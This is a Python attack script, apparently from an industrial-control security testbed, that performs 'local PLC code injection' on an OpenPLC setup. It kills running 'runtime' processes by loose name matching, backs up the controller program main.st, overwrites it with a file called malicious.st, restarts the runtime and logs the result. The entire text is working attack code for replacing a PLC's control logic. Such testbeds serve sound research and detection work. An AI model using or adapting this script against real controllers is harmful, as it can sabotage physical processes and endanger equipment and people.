import os
import shutil
import subprocess
import time
import logging
import psutil

# ——— Paths ———
ROOT_DIR     = os.path.abspath(os.path.join(__file__, '..', '..', '..'))
OPENPLC_DIR  = os.path.join(ROOT_DIR, 'openplc')
PLC_PROG_DIR = os.path.join(OPENPLC_DIR, 'PLC-program')
ORIG_ST      = os.path.join(PLC_PROG_DIR, 'main.st')
BACKUP_ST    = os.path.join(PLC_PROG_DIR, 'backup_main.st')
MALICIOUS_ST = os.path.join(os.path.dirname(__file__), 'malicious.st')
CONFIG_XML   = os.path.join(OPENPLC_DIR, 'openplc_config.xml')

# ——— Determine your “runtime” command ———
# 1) Try to find "runtime" on PATH
OPENPLC_CMD = shutil.which('runtime')
# 2) If not on PATH, fall back to the `openplc/runtime` binary in your repo
if not OPENPLC_CMD:
    fallback = os.path.join(OPENPLC_DIR, 'runtime')
    if os.path.isfile(fallback) and os.access(fallback, os.X_OK):
        OPENPLC_CMD = fallback
    else:
        raise FileNotFoundError(
            "Could not find `runtime` on PATH nor "
            f"as {fallback}. Make sure MSYS2's `runtime` is installed and on your PATH."
        )

# ——— Logging setup ———
LOG_FILE = os.path.join(ROOT_DIR, 'logs', 'raw', 'logic_injection_local.log')
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logging.info("=== Local PLC Code Injection Started ===")

# 1) Kill any running “runtime” processes
for proc in psutil.process_iter(['name','cmdline']):
    name = (proc.info['name'] or '').lower()
    cmdl = ' '.join(proc.info.get('cmdline') or []).lower()
    if 'runtime' in name or 'runtime' in cmdl:
        logging.info(f"Killing existing PLC runtime (PID {proc.pid})")
        proc.kill()
        proc.wait()

# 2) Backup the original ST
if os.path.exists(ORIG_ST):
    shutil.copy2(ORIG_ST, BACKUP_ST)
    logging.info(f"Backed up original program: {ORIG_ST} → {BACKUP_ST}")
else:
    logging.warning(f"No original program at {ORIG_ST}; nothing to back up")

# 3) Inject your malicious ST
if not os.path.isfile(MALICIOUS_ST):
    logging.error(f"Malicious file not found: {MALICIOUS_ST}")
    raise SystemExit(1)
shutil.copy2(MALICIOUS_ST, ORIG_ST)
logging.info(f"Injected malicious program: {MALICIOUS_ST} → {ORIG_ST}")

# 4) Restart the PLC runtime
cmd = [OPENPLC_CMD, '--program', 'PLC-program/main.st', '--config', CONFIG_XML]
logging.info(f"Starting PLC runtime via: {' '.join(cmd)}")
subprocess.Popen(cmd, cwd=OPENPLC_DIR)
time.sleep(3)  # give it a moment to spin up

# 5) Verify it’s back online
alive = any(
    'runtime' in (p.info['name'] or '').lower() or
    'runtime' in ' '.join(p.info.get('cmdline') or []).lower()
    for p in psutil.process_iter(['name','cmdline'])
)
logging.info(f"PLC runtime running after injection? {alive}")

logging.info("=== Local PLC Code Injection Completed ===")
